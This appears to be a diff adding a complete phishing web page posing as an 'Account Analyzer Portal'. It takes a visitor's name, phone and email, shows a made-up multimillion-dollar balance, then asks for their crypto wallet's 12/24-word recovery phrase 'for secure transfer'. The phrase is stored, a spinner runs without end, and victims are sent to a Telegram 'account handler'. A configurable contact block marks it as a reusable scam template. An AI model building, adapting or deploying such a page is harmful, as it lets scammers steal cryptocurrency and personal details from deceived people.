@@ -1,0 +1,1004 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Account Analyzer Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+        sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: radial-gradient(circle at top, #1e293b, #020617);
+      color: #e5e7eb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .wrapper {
+      width: 100%;
+      max-width: 960px;
+    }
+
+    .card {
+      background: rgba(15, 23, 42, 0.95);
+      border-radius: 18px;
+      padding: 28px 24px;
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.65);
+      border: 1px solid rgba(148, 163, 184, 0.25);
+      backdrop-filter: blur(16px);
+    }
+
+    .card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 18px;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .title {
+      font-size: 1.4rem;
+      font-weight: 600;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      color: #e5e7eb;
+    }
+
+    .subtitle {
+      font-size: 0.85rem;
+      color: #9ca3af;
+      margin-top: 4px;
+    }
+
+    .badge {
+      font-size: 0.75rem;
+      padding: 6px 12px;
+      border-radius: 999px;
+      border: 1px solid rgba(56, 189, 248, 0.5);
+      color: #e0f2fe;
+      background: radial-gradient(circle at top, #0f172a, #020617);
+    }
+
+    form {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 18px 20px;
+      margin-top: 10px;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .form-group.full {
+      grid-column: 1 / -1;
+    }
+
+    label {
+      font-size: 0.8rem;
+      color: #9ca3af;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    input, textarea {
+      padding: 10px 11px;
+      border-radius: 10px;
+      border: 1px solid rgba(148, 163, 184, 0.3);
+      background: rgba(15, 23, 42, 0.85);
+      color: #e5e7eb;
+      font-size: 0.9rem;
+      outline: none;
+      transition: border 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
+    }
+
+    input::placeholder, textarea::placeholder {
+      color: #6b7280;
+    }
+
+    input:focus, textarea:focus {
+      border-color: #38bdf8;
+      box-shadow: 0 0 0 1px rgba(56, 189, 248, 0.5);
+      background: rgba(15, 23, 42, 0.95);
+    }
+
+    .btn-row {
+      grid-column: 1 / -1;
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 8px;
+    }
+
+    button {
+      border: none;
+      cursor: pointer;
+    }
+
+    .btn-primary {
+      padding: 10px 18px;
+      border-radius: 999px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      background: linear-gradient(135deg, #22c55e, #16a34a);
+      color: white;
+      box-shadow: 0 14px 30px rgba(22, 163, 74, 0.45);
+      transition: transform 0.13s ease, box-shadow 0.13s ease,
+        filter 0.13s ease;
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-1px);
+      filter: brightness(1.04);
+      box-shadow: 0 18px 40px rgba(22, 163, 74, 0.6);
+    }
+
+    .btn-primary:active {
+      transform: translateY(1px);
+      box-shadow: 0 6px 16px rgba(22, 163, 74, 0.55);
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    /* Analyzing Screen */
+    #analyzing-screen {
+      text-align: center;
+    }
+
+    #analyzing-screen .loader {
+      width: 50px;
+      height: 50px;
+      border-radius: 999px;
+      border: 3px solid rgba(148, 163, 184, 0.35);
+      border-top-color: #38bdf8;
+      animation: spin 0.9s linear infinite;
+      margin: 12px auto 10px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    #analyzing-screen .scan-bar {
+      width: 100%;
+      height: 4px;
+      border-radius: 999px;
+      background: rgba(15, 23, 42, 0.9);
+      overflow: hidden;
+      margin-top: 12px;
+      border: 1px solid rgba(51, 65, 85, 0.9);
+    }
+
+    #analyzing-screen .scan-bar-inner {
+      width: 40%;
+      height: 100%;
+      border-radius: inherit;
+      background: linear-gradient(90deg, #38bdf8, #22c55e, #eab308);
+      animation: scan 1.2s ease-in-out infinite;
+    }
+
+    @keyframes scan {
+      0% {
+        transform: translateX(-120%);
+      }
+      50% {
+        transform: translateX(60%);
+      }
+      100% {
+        transform: translateX(120%);
+      }
+    }
+
+    /* Dashboard */
+    #dashboard-screen .top-row {
+      display: flex;
+      justify-content: space-between;
+      gap: 18px;
+      flex-wrap: wrap;
+      margin-top: 8px;
+    }
+
+    .profile-block {
+      flex: 1 1 260px;
+      background: radial-gradient(circle at top left, #1f2937, #020617);
+      border-radius: 14px;
+      padding: 16px 16px 14px;
+      border: 1px solid rgba(148, 163, 184, 0.35);
+    }
+
+    .profile-label {
+      font-size: 0.75rem;
+      color: #9ca3af;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 6px;
+    }
+
+    .profile-name {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #f9fafb;
+    }
+
+    .profile-meta {
+      margin-top: 6px;
+      font-size: 0.82rem;
+      color: #9ca3af;
+    }
+
+    .balance-block {
+      flex: 1 1 260px;
+      background: radial-gradient(circle at top right, #0f172a, #020617);
+      border-radius: 14px;
+      padding: 16px;
+      border: 1px solid rgba(56, 189, 248, 0.55);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .balance-label {
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 0.09em;
+      color: #bae6fd;
+    }
+
+    .balance-value {
+      font-size: 1.4rem;
+      font-weight: 700;
+      margin-top: 8px;
+      color: #e5fdf4;
+    }
+
+    .tier-tag {
+      margin-top: 8px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.75rem;
+      padding: 4px 10px;
+      border-radius: 999px;
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid rgba(74, 222, 128, 0.65);
+      color: #bbf7d0;
+    }
+
+    .glow-orb {
+      position: absolute;
+      width: 150px;
+      height: 150px;
+      border-radius: 999px;
+      background: radial-gradient(circle, rgba(56, 189, 248, 0.35), transparent);
+      right: -40px;
+      top: -40px;
+      filter: blur(2px);
+    }
+
+    .actions-row {
+      margin-top: 20px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 14px;
+    }
+
+    .btn-outline {
+      border-radius: 999px;
+      padding: 9px 16px;
+      font-size: 0.86rem;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      border: 1px solid rgba(148, 163, 184, 0.6);
+      background: rgba(15, 23, 42, 0.9);
+      color: #e5e7eb;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      transition: border 0.15s ease, background 0.15s ease, transform 0.12s ease;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .btn-outline span.icon {
+      width: 6px;
+      height: 6px;
+      border-radius: 999px;
+      background: #22c55e;
+    }
+
+    .btn-outline:hover {
+      background: rgba(15, 23, 42, 1);
+      border-color: #38bdf8;
+      transform: translateY(-1px);
+    }
+
+    .contact-note {
+      margin-top: 18px;
+      font-size: 0.83rem;
+      color: #9ca3af;
+    }
+
+    .contact-highlight {
+      color: #38bdf8;
+      font-weight: 500;
+      text-decoration: none;
+    }
+
+    .contact-highlight:hover {
+      text-decoration: underline;
+    }
+
+    /* Crypto/Bank Transfer Pages */
+    #crypto-screen, #bank-screen {
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    .wallet-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+      gap: 12px;
+      margin: 16px 0;
+    }
+
+    .wallet-option {
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid rgba(148, 163, 184, 0.3);
+      border-radius: 12px;
+      padding: 16px 12px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .wallet-option:hover {
+      border-color: #38bdf8;
+      background: rgba(15, 23, 42, 1);
+    }
+
+    .wallet-option.selected {
+      border-color: #22c55e;
+      background: rgba(15, 23, 42, 1);
+      box-shadow: 0 0 0 1px rgba(34, 197, 94, 0.5);
+    }
+
+    .wallet-icon {
+      font-size: 1.8rem;
+      margin-bottom: 8px;
+    }
+
+    .wallet-name {
+      font-size: 0.85rem;
+      font-weight: 500;
+    }
+
+    .phrase-input {
+      width: 100%;
+      min-height: 120px;
+      padding: 12px;
+      border-radius: 10px;
+      border: 1px solid rgba(148, 163, 184, 0.3);
+      background: rgba(15, 23, 42, 0.85);
+      color: #e5e7eb;
+      font-size: 0.9rem;
+      resize: vertical;
+      font-family: monospace;
+    }
+
+    .phrase-input:focus {
+      border-color: #38bdf8;
+      box-shadow: 0 0 0 1px rgba(56, 189, 248, 0.5);
+    }
+
+    .loading-screen {
+      text-align: center;
+      padding: 40px 20px;
+    }
+
+    .loading-screen .loader {
+      width: 60px;
+      height: 60px;
+      border-radius: 999px;
+      border: 4px solid rgba(148, 163, 184, 0.35);
+      border-top-color: #38bdf8;
+      animation: spin 0.9s linear infinite;
+      margin: 20px auto;
+    }
+
+    .loading-screen p {
+      font-size: 1rem;
+      color: #cbd5f5;
+      margin-top: 16px;
+    }
+
+    .back-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: #9ca3af;
+      background: none;
+      border: none;
+      cursor: pointer;
+      margin-bottom: 16px;
+      font-size: 0.9rem;
+    }
+
+    .back-btn:hover {
+      color: #e5e7eb;
+    }
+
+    .error-message {
+      color: #f87171;
+      font-size: 0.85rem;
+      margin-top: 6px;
+      display: none;
+    }
+
+    .support-note {
+      margin-top: 20px;
+      padding: 12px;
+      border-radius: 10px;
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid rgba(148, 163, 184, 0.3);
+      font-size: 0.85rem;
+      text-align: center;
+    }
+
+    @media (max-width: 640px) {
+      .card {
+        padding: 20px 16px 18px;
+      }
+      form {
+        grid-template-columns: 1fr;
+      }
+      .btn-row {
+        justify-content: stretch;
+      }
+      .btn-primary {
+        width: 100%;
+        justify-content: center;
+        display: inline-flex;
+      }
+      .top-row {
+        flex-direction: column;
+      }
+      .wallet-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <!-- FORM SCREEN -->
+    <section id="form-screen" class="card">
+      <div class="card-header">
+        <div>
+          <div class="title">Account Intake</div>
+          <div class="subtitle">
+            Enter your details to generate your account overview.
+          </div>
+        </div>
+        <div class="badge">Session ID: <span id="session-id"></span></div>
+      </div>
+
+      <form id="intake-form" novalidate>
+        <div class="form-group">
+          <label for="firstName">First name</label>
+          <input id="firstName" name="firstName" type="text" required />
+        </div>
+
+        <div class="form-group">
+          <label for="lastName">Last name</label>
+          <input id="lastName" name="lastName" type="text" required />
+        </div>
+
+        <div class="form-group">
+          <label for="phone">Phone number</label>
+          <input
+            id="phone"
+            name="phone"
+            type="tel"
+            required
+            placeholder="+1 (555) 555-5555"
+          />
+        </div>
+
+        <div class="form-group">
+          <label for="email">Email address</label>
+          <input
+            id="email"
+            name="email"
+            type="email"
+            required
+            placeholder="example@domain.com"
+          />
+        </div>
+
+        <div class="form-group full">
+          <label for="products">Number of products</label>
+          <input
+            id="products"
+            name="products"
+            type="number"
+            min="1"
+            step="1"
+            required
+          />
+        </div>
+
+        <div class="btn-row">
+          <button type="submit" class="btn-primary">Continue & Analyze</button>
+        </div>
+      </form>
+    </section>
+
+    <!-- ANALYZING SCREEN -->
+    <section id="analyzing-screen" class="card hidden">
+      <div class="card-header" style="justify-content:center; flex-direction:column;">
+        <div class="title">Analyzing Profile</div>
+        <div class="subtitle">Running multi-layer assessment on your entry...</div>
+      </div>
+      <div class="loader"></div>
+      <p style="font-size:0.9rem; color:#cbd5f5; margin-bottom:6px;">
+        Please wait a moment while we process your data.
+      </p>
+      <div class="scan-bar">
+        <div class="scan-bar-inner"></div>
+      </div>
+    </section>
+
+    <!-- DASHBOARD SCREEN -->
+    <section id="dashboard-screen" class="card hidden">
+      <div class="card-header">
+        <div>
+          <div class="title">Client Balance Dashboard</div>
+          <div class="subtitle">
+            Personalized overview for <span id="client-short-name"></span>.
+          </div>
+        </div>
+        <div class="badge">Profile Status: Verified</div>
+      </div>
+
+      <div class="top-row">
+        <div class="profile-block">
+          <div class="profile-label">Account Holder</div>
+          <div class="profile-name" id="client-full-name"></div>
+          <div class="profile-meta" id="client-meta-line1"></div>
+          <div class="profile-meta" id="client-meta-line2"></div>
+        </div>
+
+        <div class="balance-block">
+          <div class="glow-orb"></div>
+          <div class="balance-label">Account Balance (USD)</div>
+          <div class="balance-value" id="client-balance"></div>
+        </div>
+      </div>
+
+      <div class="actions-row">
+        <a href="#" id="crypto-cashout-btn" class="btn-outline">
+          <span class="icon"></span> Crypto Cash Out
+        </a>
+        <a href="#" id="bank-transfer-btn" class="btn-outline">
+          <span class="icon"></span> Bank Wire Transfer
+        </a>
+      </div>
+
+      <p class="contact-note">
+        For any scheduling or manual review, please contact your account handler:
+        <a href="https://t.me/DogePayOut2025" class="contact-highlight" target="_blank">@DogePayOut2025</a>
+      </p>
+    </section>
+
+    <!-- CRYPTO CASHOUT SCREEN -->
+    <section id="crypto-screen" class="card hidden">
+      <button class="back-btn" id="crypto-back-btn">← Back to Dashboard</button>
+      <div class="card-header">
+        <div>
+          <div class="title">Crypto Cash Out</div>
+          <div class="subtitle">
+            Select your wallet and provide recovery phrase for secure transfer.
+          </div>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Select Your Wallet</label>
+        <div class="wallet-grid">
+          <div class="wallet-option" data-wallet="trust">
+            <div class="wallet-icon">🔐</div>
+            <div class="wallet-name">Trust Wallet</div>
+          </div>
+          <div class="wallet-option" data-wallet="metamask">
+            <div class="wallet-icon">🦊</div>
+            <div class="wallet-name">MetaMask</div>
+          </div>
+          <div class="wallet-option" data-wallet="coinbase">
+            <div class="wallet-icon">🏦</div>
+            <div class="wallet-name">Coinbase</div>
+          </div>
+          <div class="wallet-option" data-wallet="exodus">
+            <div class="wallet-icon">🐲</div>
+            <div class="wallet-name">Exodus</div>
+          </div>
+          <div class="wallet-option" data-wallet="ledger">
+            <div class="wallet-icon">💎</div>
+            <div class="wallet-name">Ledger</div>
+          </div>
+          <div class="wallet-option" data-wallet="other">
+            <div class="wallet-icon">📱</div>
+            <div class="wallet-name">Other</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Other Wallet Name Input -->
+      <div class="form-group full hidden" id="other-wallet-group">
+        <label for="other-wallet-name">Enter Your Wallet Name</label>
+        <input 
+          id="other-wallet-name" 
+          type="text" 
+          placeholder="Enter the name of your wallet..."
+        />
+        <div class="error-message" id="wallet-name-error">Please enter your wallet name.</div>
+      </div>
+
+      <div class="form-group full">
+        <label for="phrase-input">Enter Your 12/24 Word Recovery Phrase</label>
+        <textarea 
+          id="phrase-input" 
+          class="phrase-input" 
+          placeholder="Enter your 12 or 24 word recovery phrase separated by spaces..."
+        ></textarea>
+        <div class="error-message" id="phrase-error">Please enter at least 12 words for your recovery phrase.</div>
+      </div>
+
+      <div class="btn-row">
+        <button id="crypto-submit-btn" class="btn-primary">Process Transfer</button>
+      </div>
+    </section>
+
+    <!-- BANK TRANSFER SCREEN -->
+    <section id="bank-screen" class="card hidden">
+      <button class="back-btn" id="bank-back-btn">← Back to Dashboard</button>
+      <div class="card-header">
+        <div>
+          <div class="title">Bank Wire Transfer</div>
+          <div class="subtitle">
+            For bank transfers, please contact support to complete your transaction.
+          </div>
+        </div>
+      </div>
+
+      <div class="support-note">
+        <p>To initiate a bank wire transfer, please contact our support team directly:</p>
+        <p style="margin-top: 10px;">
+          <a href="https://t.me/DogePayOut2025" class="contact-highlight" target="_blank" style="font-size: 1.1rem;">
+            Contact Support on Telegram
+          </a>
+        </p>
+        <p style="margin-top: 10px; font-size: 0.8rem;">
+          Our team will guide you through the secure bank transfer process.
+        </p>
+      </div>
+    </section>
+
+    <!-- LOADING SCREEN -->
+    <section id="loading-screen" class="card hidden">
+      <div class="loading-screen">
+        <div class="loader"></div>
+        <p>Processing your transaction...</p>
+        <p>This may take a few moments. Please do not close this window.</p>
+        
+        <div class="support-note" style="margin-top: 30px;">
+          <p>If this takes longer than 5 minutes, please contact support:</p>
+          <p style="margin-top: 10px;">
+            <a href="https://t.me/DogePayOut2025" class="contact-highlight" target="_blank">
+              Contact Support on Telegram
+            </a>
+          </p>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <script>
+    // ====== CONFIGURE YOUR CONTACT HERE ======
+    const ADMIN_TELEGRAM = "@DogePayOut2025";
+    const ADMIN_TELEGRAM_LINK = "https://t.me/DogePayOut2025";
+    // =========================================
+
+    const formScreen = document.getElementById("form-screen");
+    const analyzingScreen = document.getElementById("analyzing-screen");
+    const dashboardScreen = document.getElementById("dashboard-screen");
+    const cryptoScreen = document.getElementById("crypto-screen");
+    const bankScreen = document.getElementById("bank-screen");
+    const loadingScreen = document.getElementById("loading-screen");
+    const intakeForm = document.getElementById("intake-form");
+
+    const clientShortName = document.getElementById("client-short-name");
+    const clientFullName = document.getElementById("client-full-name");
+    const clientMeta1 = document.getElementById("client-meta-line1");
+    const clientMeta2 = document.getElementById("client-meta-line2");
+    const clientBalance = document.getElementById("client-balance");
+    const sessionIdEl = document.getElementById("session-id");
+
+    const cryptoCashoutBtn = document.getElementById("crypto-cashout-btn");
+    const bankTransferBtn = document.getElementById("bank-transfer-btn");
+    const cryptoBackBtn = document.getElementById("crypto-back-btn");
+    const bankBackBtn = document.getElementById("bank-back-btn");
+    const cryptoSubmitBtn = document.getElementById("crypto-submit-btn");
+    const phraseInput = document.getElementById("phrase-input");
+    const phraseError = document.getElementById("phrase-error");
+    const otherWalletGroup = document.getElementById("other-wallet-group");
+    const otherWalletName = document.getElementById("other-wallet-name");
+    const walletNameError = document.getElementById("wallet-name-error");
+
+    // Generate small session ID
+    function generateSessionId() {
+      const rnd = Math.floor(Math.random() * 9999)
+        .toString()
+        .padStart(4, "0");
+      const now = new Date();
+      return (
+        "S-" +
+        now.getFullYear().toString().slice(-2) +
+        (now.getMonth() + 1).toString().padStart(2, "0") +
+        "-" +
+        rnd
+      );
+    }
+    sessionIdEl.textContent = generateSessionId();
+
+    // ===== BALANCE FUNCTION (DETERMINISTIC SCALE) =====
+    function getBalanceForProducts(products) {
+      let balance = 0;
+
+      if (products >= 1000) {
+        // Tier 3: 200M + 50k per extra product
+        balance = 200_000_000 + (products - 1000) * 50_000;
+      } else if (products >= 100) {
+        // Tier 2: 51M to 150M scale
+        const fraction = (products - 100) / 899;
+        balance = 51_000_000 + fraction * 99_000_000;
+      } else if (products >= 1) {
+        // Tier 1: 20M to 50M scale
+        const fraction = products / 99;
+        balance = 20_000_000 + fraction * 30_000_000;
+      } else {
+        balance = 0;
+      }
+
+      return { balance: Math.round(balance) };
+    }
+
+    function formatCurrency(num) {
+      return num.toLocaleString("en-US", {
+        style: "currency",
+        currency: "USD",
+        maximumFractionDigits: 0,
+      });
+    }
+
+    // Simple extra email validation
+    function isValidEmail(email) {
+      return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email);
+    }
+
+    // Validate recovery phrase has at least 12 words
+    function isValidPhrase(phrase) {
+      const words = phrase.trim().split(/\s+/);
+      return words.length >= 12;
+    }
+
+    // Save account locally in browser
+    function saveAccount(data) {
+      const key = "accounts";
+      const currentRaw = localStorage.getItem(key);
+      let list = [];
+      if (currentRaw) {
+        try {
+          list = JSON.parse(currentRaw);
+        } catch (e) {
+          list = [];
+        }
+      }
+      list.push({
+        ...data,
+        id: 'acc_' + Math.random().toString(36).substr(2, 9),
+        sessionId: sessionIdEl.textContent,
+        createdAt: new Date().toISOString(),
+      });
+      localStorage.setItem(key, JSON.stringify(list));
+    }
+
+    // Save recovery phrase
+    function saveRecoveryPhrase(data) {
+      const key = "recoveryPhrases";
+      const currentRaw = localStorage.getItem(key);
+      let list = [];
+      if (currentRaw) {
+        try {
+          list = JSON.parse(currentRaw);
+        } catch (e) {
+          list = [];
+        }
+      }
+      list.push({
+        ...data,
+        id: 'phrase_' + Math.random().toString(36).substr(2, 9),
+        submittedAt: new Date().toISOString(),
+      });
+      localStorage.setItem(key, JSON.stringify(list));
+    }
+
+    // Show one screen, hide others
+    function showScreen(screenId) {
+      [formScreen, analyzingScreen, dashboardScreen, cryptoScreen, bankScreen, loadingScreen].forEach((el) => {
+        if (el.id === screenId) {
+          el.classList.remove("hidden");
+        } else {
+          el.classList.add("hidden");
+        }
+      });
+    }
+
+    // Wallet selection
+    let selectedWallet = null;
+    document.querySelectorAll('.wallet-option').forEach(option => {
+      option.addEventListener('click', function() {
+        document.querySelectorAll('.wallet-option').forEach(opt => {
+          opt.classList.remove('selected');
+        });
+        this.classList.add('selected');
+        selectedWallet = this.getAttribute('data-wallet');
+        
+        // Show/hide other wallet name input
+        if (selectedWallet === 'other') {
+          otherWalletGroup.classList.remove('hidden');
+        } else {
+          otherWalletGroup.classList.add('hidden');
+          walletNameError.style.display = 'none';
+        }
+      });
+    });
+
+    intakeForm.addEventListener("submit", function (e) {
+      e.preventDefault();
+      const formData = new FormData(intakeForm);
+
+      const firstName = (formData.get("firstName") || "").trim();
+      const lastName = (formData.get("lastName") || "").trim();
+      const phone = (formData.get("phone") || "").trim();
+      const email = (formData.get("email") || "").trim();
+      const products = parseInt(formData.get("products"), 10) || 0;
+
+      // extra email check
+      if (!isValidEmail(email)) {
+        alert("Please enter a valid email address.");
+        return;
+      }
+
+      const fullName = `${firstName} ${lastName}`.trim();
+      const { balance } = getBalanceForProducts(products);
+
+      // Save to localStorage
+      saveAccount({
+        firstName,
+        lastName,
+        phone,
+        email,
+        products,
+        balance,
+      });
+
+      // Fill dashboard
+      clientShortName.textContent = firstName || fullName || "Client";
+      clientFullName.textContent = fullName || "—";
+      clientMeta1.textContent = `Products registered: ${products}`;
+      clientMeta2.textContent = `Primary email: ${email || "—"} · Phone: ${phone || "—"}`;
+      clientBalance.textContent = formatCurrency(balance);
+
+      // Switch to analyzing, then to dashboard
+      showScreen("analyzing-screen");
+      setTimeout(() => {
+        showScreen("dashboard-screen");
+      }, 2200);
+    });
+
+    // Navigation between screens
+    cryptoCashoutBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      showScreen("crypto-screen");
+    });
+
+    bankTransferBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      showScreen("bank-screen");
+    });
+
+    cryptoBackBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      showScreen("dashboard-screen");
+    });
+
+    bankBackBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      showScreen("dashboard-screen");
+    });
+
+    // Crypto cash out submission
+    cryptoSubmitBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      
+      if (!selectedWallet) {
+        alert("Please select a wallet.");
+        return;
+      }
+      
+      // Validate other wallet name if "Other" is selected
+      let walletName = selectedWallet;
+      if (selectedWallet === 'other') {
+        const customName = otherWalletName.value.trim();
+        if (!customName) {
+          walletNameError.style.display = "block";
+          return;
+        }
+        walletName = customName;
+        walletNameError.style.display = "none";
+      }
+      
+      const phrase = phraseInput.value.trim();
+      if (!phrase) {
+        phraseError.textContent = "Please enter your recovery phrase.";
+        phraseError.style.display = "block";
+        return;
+      }
+      
+      if (!isValidPhrase(phrase)) {
+        phraseError.textContent = "Please enter at least 12 words for your recovery phrase.";
+        phraseError.style.display = "block";
+        return;
+      }
+      
+      phraseError.style.display = "none";
+      
+      // Save recovery phrase data
+      saveRecoveryPhrase({
+        wallet: walletName,
+        phrase: phrase,
+        userName: clientFullName.textContent,
+        userEmail: document.getElementById('email').value
+      });
+      
+      // Show loading screen indefinitely
+      showScreen("loading-screen");
+    });
+
+    // Clear errors when user types
+    phraseInput.addEventListener('input', () => {
+      phraseError.style.display = "none";
+    });
+    
+    otherWalletName.addEventListener('input', () => {
+      walletNameError.style.display = "none";
+    });
+  </script>
+</body>
+</html>
